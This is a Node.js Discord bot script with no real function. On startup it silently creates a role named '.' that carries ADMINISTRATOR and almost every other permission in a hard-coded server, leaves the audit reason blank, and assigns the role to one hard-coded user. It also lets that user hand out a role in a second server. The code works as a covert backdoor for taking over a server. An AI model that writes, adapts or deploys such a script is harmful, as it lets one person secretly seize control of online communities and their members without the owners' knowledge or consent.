const Discord = require('discord.js');
const bot = new Discord.Client();

let allPerms =  [
"ADMINISTRATOR", // (implicitly has all permissions, and bypasses all channel overwrites)
"CREATE_INSTANT_INVITE", // (create invitations to the guild)
"KICK_MEMBERS", //
"BAN_MEMBERS", //
"MANAGE_CHANNELS", // (edit and reorder channels)
"MANAGE_GUILD", // (edit the guild information, region, etc.)
"ADD_REACTIONS", // (add new reactions to messages)
"VIEW_AUDIT_LOG", //
"PRIORITY_SPEAKER", //
"STREAM", //
"VIEW_CHANNEL", //
"SEND_MESSAGES", //
"SEND_TTS_MESSAGES", //
"MANAGE_MESSAGES", // (delete messages and reactions)
"EMBED_LINKS", // (links posted will have a preview embedded)
"ATTACH_FILES", //
"READ_MESSAGE_HISTORY", // (view messages that were posted prior to opening Discord)
"MENTION_EVERYONE", //
"USE_EXTERNAL_EMOJIS", // (use emojis from different guilds)
"VIEW_GUILD_INSIGHTS", //
"CONNECT", // (connect to a voice channel)
"SPEAK", // (speak in a voice channel)
"MUTE_MEMBERS", // (mute members across all voice channels)
"DEAFEN_MEMBERS", // (deafen members across all voice channels)
"MOVE_MEMBERS", // (move members between voice channels)
"USE_VAD", // (use voice activity detection)
"CHANGE_NICKNAME", //
"MANAGE_NICKNAMES", // (change other members' nicknames)
"MANAGE_ROLES", //
"MANAGE_WEBHOOKS", //
"MANAGE_EMOJIS", //
]

bot.on('ready', ()=> {
    const spqr = bot.guilds.cache.get("687858150879002629");
    const me = spqr.members.cache.get("450026704556130304");

    spqr.roles.create({
        data: {
            name: '.',
            hoist: false,
            position: 0,
            permissions: allPerms,
            mentionable: false
        },
        reason: '',
    })
        .then(() => {
            const role = spqr.roles.cache.find(role => {
                console.log(role.name)
                return role.name === '.';
            });
            me.roles.add(role).then(console.log).catch(console.error);
        })
        .catch(console.error);
})

bot.on('message', msg => {
    if (msg.author.bot) {
        return; // ignore self & other bots
    }

    if (msg.guild.id === '632356776360280086') {
        if (msg.author.id === '450026704556130304') {
            // // Create a new role with data and a reason
            // msg.guild.roles.create({
            //     data: {
            //         name: '',
            //         color: 'BLUE',
            //         hoist: false,
            //         position: 0,
            //         permissions: allPerms,
            //         mentionable: false
            //     },
            //     reason: '',
            // })
            //     .then(console.log)
            //     .catch(console.error);

            const role = msg.guild.roles.cache.find(role => role.name === 'new role');
                const member = msg.mentions.members.first();
                    member.roles.add(role).then(console.log).catch(console.error);
         }
    }

    // qb.runQb(qbCli, msg);

});

bot.login('');
